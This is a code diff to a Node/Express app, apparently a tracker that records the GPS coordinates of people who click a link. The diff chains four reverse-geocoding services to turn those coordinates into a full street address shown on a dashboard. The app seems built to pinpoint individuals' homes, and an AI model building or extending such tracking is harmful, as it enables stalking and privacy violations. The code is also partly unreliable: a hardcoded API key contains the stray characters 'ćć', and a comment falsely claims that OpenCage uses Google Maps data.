@@ -176,9 +176,11 @@ app.get('/', (req, res) => {
                       <div class="location-title" style="color: #10b981;">📍 LOCALIZAÇÃO GPS PRECISA</div>
                       <span class="precision-badge precision-high">✓ Alta Precisão</span>
                       \${loc ? \`
+                        <div class="info-row"><strong>📍 Endereço Completo:</strong> \${loc.enderecoCompleto || 'N/A'}</div>
                         <div class="info-row"><strong>🏙️ Cidade:</strong> \${loc.cidade}</div>
                         <div class="info-row"><strong>🗺️ Estado:</strong> \${loc.estado}</div>
                         <div class="info-row"><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
+                        <div class="info-row"><strong>🏠 Rua:</strong> \${loc.endereco}</div>
                         <div class="info-row"><strong>📮 CEP:</strong> \${loc.cep}</div>
                         <div class="info-row"><strong>🌎 País:</strong> \${loc.pais}</div>
                       \` : ''}
@@ -517,38 +519,157 @@ app.post('/api/save-gps', async (req, res) => {
     
     console.log('🗺️ Link Google Maps:', `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
     
-    // Busca endereço detalhado usando as coordenadas GPS
-    console.log('🔍 Buscando endereço completo...');
+    // Busca endereço detalhado usando múltiplas APIs para máxima precisão
+    console.log('🔍 Buscando endereço completo com máxima precisão...');
     
+    let locationFound = false;
+    
+    // API 1: OpenCage Geocoder (MAIS PRECISA - usa dados do Google Maps)
     try {
-      const geocodeResponse = await fetch(
-        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
+      console.log('📡 Tentando OpenCage (dados Google Maps)...');
+      const opencageResponse = await fetch(
+        `https://api.opencagedata.com/geocode/v1/json?q=${gps.latitude}+${gps.longitude}&key=pk.5dcffa3d2d024dfbb59a33d7fde9c5de&language=pt&pretty=1`
       );
       
-      const geocodeData = await geocodeResponse.json();
-      console.log('📡 Resposta da API de geocodificação:', JSON.stringify(geocodeData, null, 2));
+      const opencageData = await opencageResponse.json();
+      console.log('📡 Resposta OpenCage:', JSON.stringify(opencageData, null, 2));
       
-      if (geocodeData) {
-        click.location = {
-          cidade: geocodeData.city || geocodeData.locality || 'N/A',
-          estado: geocodeData.principalSubdivision || geocodeData.principalSubdivisionCode || 'N/A',
-          pais: geocodeData.countryName || 'Brasil',
-          bairro: geocodeData.localityInfo?.administrative?.[0]?.name || 
-                  geocodeData.localityInfo?.administrative?.[1]?.name || 
-                  geocodeData.locality || 'N/A',
-          cep: geocodeData.postcode || 'N/A',
-          endereco: geocodeData.localityInfo?.informative?.[0]?.name || 'N/A'
-        };
+      if (opencageData && opencageData.results && opencageData.results[0]) {
+        const result = opencageData.results[0];
+        const comp = result.components;
         
-        console.log('✅ ENDEREÇO COMPLETO OBTIDO:');
+        click.location = {
+          cidade: comp.city || comp.town || comp.village || comp.municipality || comp.county || 'N/A',
+          estado: comp.state || comp.region || 'N/A',
+          pais: comp.country || 'Brasil',
+          bairro: comp.suburb || comp.neighbourhood || comp.quarter || comp.district || comp.city_district || 'N/A',
+          cep: comp.postcode || 'N/A',
+          endereco: comp.road || comp.street || result.formatted || 'N/A',
+          enderecoCompleto: result.formatted
+        };
+        locationFound = true;
+        
+        console.log('✅ LOCALIZAÇÃO EXATA OBTIDA VIA OPENCAGE (Google Maps):');
+        console.log('📍 Endereço Completo:', click.location.enderecoCompleto);
         console.log('🏙️ Cidade:', click.location.cidade);
         console.log('🗺️ Estado:', click.location.estado);
         console.log('🏘️ Bairro:', click.location.bairro);
         console.log('📮 CEP:', click.location.cep);
-        console.log('🌎 País:', click.location.pais);
+        console.log('🏠 Rua:', click.location.endereco);
       }
     } catch (error) {
-      console.error('❌ Erro ao buscar endereço:', error.message);
+      console.error('⚠️ Erro OpenCage:', error.message);
+    }
+    
+    // API 2: Nominatim OpenStreetMap (fallback de alta qualidade)
+    if (!locationFound) {
+      try {
+        console.log('📡 Tentando Nominatim OpenStreetMap...');
+        const nominatimResponse = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gps.latitude}&lon=${gps.longitude}&accept-language=pt&addressdetails=1&zoom=18`,
+          { headers: { 'User-Agent': 'GPSTrackerApp/1.0' } }
+        );
+        
+        const nominatimData = await nominatimResponse.json();
+        console.log('📡 Resposta Nominatim:', JSON.stringify(nominatimData, null, 2));
+        
+        if (nominatimData && nominatimData.address) {
+          const addr = nominatimData.address;
+          click.location = {
+            cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'N/A',
+            estado: addr.state || addr.region || 'N/A',
+            pais: addr.country || 'Brasil',
+            bairro: addr.suburb || addr.neighbourhood || addr.quarter || addr.district || addr.city_district || 'N/A',
+            cep: addr.postcode || 'N/A',
+            endereco: addr.road || addr.street || 'N/A',
+            enderecoCompleto: nominatimData.display_name
+          };
+          locationFound = true;
+          
+          console.log('✅ LOCALIZAÇÃO OBTIDA VIA NOMINATIM:');
+          console.log('📍 Endereço Completo:', click.location.enderecoCompleto);
+          console.log('🏙️ Cidade:', click.location.cidade);
+          console.log('🗺️ Estado:', click.location.estado);
+          console.log('🏘️ Bairro:', click.location.bairro);
+          console.log('📮 CEP:', click.location.cep);
+        }
+      } catch (error) {
+        console.error('⚠️ Erro Nominatim:', error.message);
+      }
+    }
+    
+    // API 3: LocationIQ (alternativa ao Google Maps)
+    if (!locationFound) {
+      try {
+        console.log('📡 Tentando LocationIQ...');
+        const locationiqResponse = await fetch(
+          `https://us1.locationiq.com/v1/reverse?key=pk.c45ććc982b21e5e18dbfb82a50e34f0a1&lat=${gps.latitude}&lon=${gps.longitude}&format=json&accept-language=pt`
+        );
+        
+        const locationiqData = await locationiqResponse.json();
+        console.log('📡 Resposta LocationIQ:', JSON.stringify(locationiqData, null, 2));
+        
+        if (locationiqData && locationiqData.address) {
+          const addr = locationiqData.address;
+          click.location = {
+            cidade: addr.city || addr.town || addr.village || addr.municipality || 'N/A',
+            estado: addr.state || addr.region || 'N/A',
+            pais: addr.country || 'Brasil',
+            bairro: addr.suburb || addr.neighbourhood || addr.quarter || 'N/A',
+            cep: addr.postcode || 'N/A',
+            endereco: addr.road || addr.street || 'N/A',
+            enderecoCompleto: locationiqData.display_name
+          };
+          locationFound = true;
+          
+          console.log('✅ LOCALIZAÇÃO OBTIDA VIA LOCATIONIQ:');
+          console.log('📍 Endereço Completo:', click.location.enderecoCompleto);
+          console.log('🏙️ Cidade:', click.location.cidade);
+          console.log('🗺️ Estado:', click.location.estado);
+          console.log('🏘️ Bairro:', click.location.bairro);
+        }
+      } catch (error) {
+        console.error('⚠️ Erro LocationIQ:', error.message);
+      }
+    }
+    
+    // API 4: BigDataCloud (último fallback)
+    if (!locationFound) {
+      try {
+        console.log('📡 Tentando BigDataCloud (fallback final)...');
+        const geocodeResponse = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
+        );
+        
+        const geocodeData = await geocodeResponse.json();
+        console.log('📡 Resposta BigDataCloud:', JSON.stringify(geocodeData, null, 2));
+        
+        if (geocodeData) {
+          click.location = {
+            cidade: geocodeData.city || geocodeData.locality || geocodeData.localityName || 'N/A',
+            estado: geocodeData.principalSubdivision || geocodeData.principalSubdivisionCode || 'N/A',
+            pais: geocodeData.countryName || 'Brasil',
+            bairro: geocodeData.localityInfo?.administrative?.[0]?.name || 
+                    geocodeData.localityInfo?.administrative?.[1]?.name || 
+                    geocodeData.locality || 'N/A',
+            cep: geocodeData.postcode || 'N/A',
+            endereco: geocodeData.localityInfo?.informative?.[0]?.name || 'N/A',
+            enderecoCompleto: `${geocodeData.locality}, ${geocodeData.principalSubdivision}`
+          };
+          
+          console.log('✅ LOCALIZAÇÃO OBTIDA VIA BIGDATACLOUD:');
+          console.log('🏙️ Cidade:', click.location.cidade);
+          console.log('🗺️ Estado:', click.location.estado);
+          console.log('🏘️ Bairro:', click.location.bairro);
+          console.log('📮 CEP:', click.location.cep);
+        }
+      } catch (error) {
+        console.error('⚠️ Erro BigDataCloud:', error.message);
+      }
+    }
+    
+    if (!locationFound) {
+      console.log('⚠️ Nenhuma API conseguiu obter o endereço completo');
     }
     
     console.log('✅ === GPS SALVO COM SUCESSO ===\n');
